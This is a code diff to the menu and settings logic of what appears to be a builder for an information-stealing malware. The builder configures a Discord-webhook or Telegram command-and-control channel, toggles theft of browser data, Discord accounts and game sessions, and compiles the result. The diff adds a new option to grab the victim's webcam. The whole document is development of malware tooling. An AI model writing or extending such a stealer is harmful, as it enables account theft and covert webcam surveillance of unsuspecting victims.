@@ -20,6 +20,7 @@ config = {
     "browsers": False,
     "discordacc": False,
     "games": False,
+    "webcam": False,
 }
 
 def load(file):
@@ -63,6 +64,7 @@ def fetchsettings():
     grabbrowsers = config['browsers']
     grabdiscord = config['discordacc']
     grabgames = config['games']
+    grabwebcam = config['webcam']
     if c2type == 'discord':
         print('''Settings
         
@@ -70,7 +72,8 @@ def fetchsettings():
     Webhook URL: {}
     Grab browsing data: {}
     Grab discord accounts: {}
-    Grab game sessions: {}'''.format(c2type, webhookurl, grabbrowsers, grabdiscord, grabgames))
+    Grab game sessions: {}
+    Grab webcam: {}'''.format(c2type, webhookurl, grabbrowsers, grabdiscord, grabgames, grabwebcam))
     elif c2type == 'telegram':
         print('''Settings
         
@@ -78,14 +81,15 @@ def fetchsettings():
     Telegram bot and chat id: {}
     Grab browsing data: {}
     Grab discord accounts: {}
-    Grab game sessions: {}'''.format(c2type, telebot, grabbrowsers, grabdiscord, grabgames))
+    Grab game sessions: {}
+    Grab webcam: {}'''.format(c2type, telebot, grabbrowsers, grabdiscord, grabgames, grabwebcam))
 
 def menu():
     global config
     asc = Ascii()
     print(asc.ascii())
     print(Options().options())
-    options = ['ChangeC2', 'CollectBrowsers', 'CollectDiscord', 'CollectGames', 'SaveSettings', 'Compile']
+    options = ['ChangeC2', 'CollectBrowsers', 'CollectDiscord', 'CollectGames', 'CollectWebcam', 'SaveSettings', 'Compile']
     
     fetchsettings()
     opts = {str(i + 1): name for i, name in enumerate(options)}
@@ -133,7 +137,12 @@ def menu():
                 config['games'] = not config['games']
                 cls()
                 menu()
-            
+
+            elif name == 'CollectWebcam':
+                config['webcam'] = not config['webcam']
+                cls()
+                menu()
+
             elif name == 'SaveSettings':
                 applysettings()
                 cls()
